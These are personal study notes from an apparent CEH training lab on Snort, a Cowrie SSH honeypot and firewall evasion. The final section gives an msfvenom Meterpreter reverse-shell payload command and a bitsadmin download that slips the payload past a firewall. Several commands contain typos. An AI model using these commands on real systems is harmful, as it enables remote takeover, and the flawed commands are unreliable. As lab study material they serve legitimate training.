# Evading IDS, Firewalls, and Honeypots

more or less means to attempt to target a machine that is behind a firewall
be it attacking the target or getting info about the target that is behind the firewall


### detect intrusion

tool used
#### [[Snort]] [[windows]]

1. Install snort exe on the windows machine and Snort requires WinPcap to be installed on your machine.
2. Snort installs itself in C:\Snort
3. Navigate to the **etc folder** in the specified location, E:\CEH-Tools\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150\etc of the Snort rules; **copy snort.conf and paste it in C:\Snort\etc**.
4. Snort.conf is already present in C:\Snort\etc; replace the file with the newly copied file.
5. Copy the **so_rules,rules,preprocs_rules** folder from E:\CEH-Tools\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150 and paste into C:\Snort.
6. Open Command Prompt window ; type cd C:\Snort\bin and press Enter to access the bin folder in the command prompt. Run snort command to initiate snort.
7. Snort initializes; wait for it to complete. Press Ctrl+C after some time, Snort exits and comes back to C:\Snort\bin.
8. Now type **snort -W**. This command lists your machine’s physical address, IP address, and Ethernet Drivers, but all are disabled by default.


### deploying honeypot

tool used
#### Cowrie

```
sudo adduser --disbled-password cowrie
```

→ copy all the contents of the cowrie folder to `/home/ubuntu`

open a new terminal and `sudo su`
```bash
cd cowrie
```
```bash
pip install --upgrade -r requirements.txt
```
```bash
cd ..
```
```bash
chnmod -R 777 cowrie
```
```bash
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
```
> this will redirect all the traffic meant for port 22 to the port 2222
> > -t nat = specifies which table the rule to be added *here NAT(Network Address Translation)*
> > -A PREROUTING = specifies which rule to be appended *here it means that it should be redirected before any routing decisions are made*
> > -p tcp = specifies for which protocol the rule is made *here TCP*
> > -dport 22= specifies the destination port *here 22 (common port for ssh)*
> > -j REDIRECT = specifies the rule *here it is to redirect*
> > --to-port = to which port the should be redirected *here 2222*
> > > as it is 2222 all the traffic meant for 22 will go to 2222

now we need to make it so that cowrie can use the port 22 without any root privileges

```bash
touch /etc/authbind/byport/22
```
```bash
chown cowrie:cowrie /etc/authbind/byport/22
```
```bash
chmod 770 /etc/authbind/byport/22
```

to create a virtual environment for cowrie
```bash
virtualenv python=python3 cowrie-env
```

exit the root privileges
```bash
exit
```

move into the cowrie and start the honeypot
```bash
cd cowrie
```
```bash
bin/cowrie start
```

now the honeypot is set for anyone to try and break into out computer
the logs of attempts on our honeypot are seen by reading
```bash
tail /var/logs/cowrie/cowrie.log
```
by default this command only shows the last 10 lines of the logs
if we want to see more we can do that by
```bash
tail -n <desired-length> /var/logs/cowrie/cowrie.log
```

---
now we simulate an attempt on our honeypot

tool used
#### [[PuTTy]]
#tool/linux #gui 
putty is a gui interface for ssh connections

in the attacker machine
first as an attacker we enumerate the target
```bash
nmap -sV -p- 10.10.1.9
```
we see ssh port is open (22)

```bash
putty
```
to open putty

→ enter the host name *here 10.10.1.9*
→ open
→ enter a random name *here ubuntu*
→ try a bunch of random passwords
→ we see that it doesn't open

> > on the honeypot system we can read the logs and see that someone is attempting to login

→ now enter the name as `root`
→ enter a random password
→ we are in *technically we are inside the honeypot*
→ but as an attacker we do not know that and we continue to poke around
→ try a bunch of commands ls -lha, whoami, pwd etc.

> > on the other hand we check progress on pot honeypot by reading the logs, and we can see all the commands and everything the attacker is trying to do in our pc

## Evade IDS/[[Firewall]]

tool used
#### [[BITSAdmin]] [[windows]]

in this lab we are simulating that we have already hacked the machine
and we need to transfer a file into the machine
but in normal case the file will eb detected by the firewall and won't be allowed inside
so instead of sending something inside, we go inside and ask for something to be delivered inside
hence the request will generate from the inside so it is less likely to be stopped by the firewall

but to implement this command first we need to have our `exploit.exe` in the right place

```bash
msfvenom -p windows/meterpreter/reverse_tcp lport=4444 lhost=10.10.1.13 -f exe -O Exploit.exe
```

```bash
mkdir /var/www/html/share
```
```bash
chmod -R 755 /var/www/html/share
```
```bash
chown -R www-data:www-data /var/www/html/share
```
```bash
service apache2 start
```

In Victim windows machine:

Turn on windows defender firewall and then do follow below cmd:

```PowerShell
bitsadmin /transfer exploit.exe http://10.10.1.12/share/exploit.exe c:\exploit.exe
```


this will create a file that is accessible via requests
we need to place our `exploit.exe` inside this share 
*exploit.exe is a place holder and it can be any payload or exploit with any name*

---
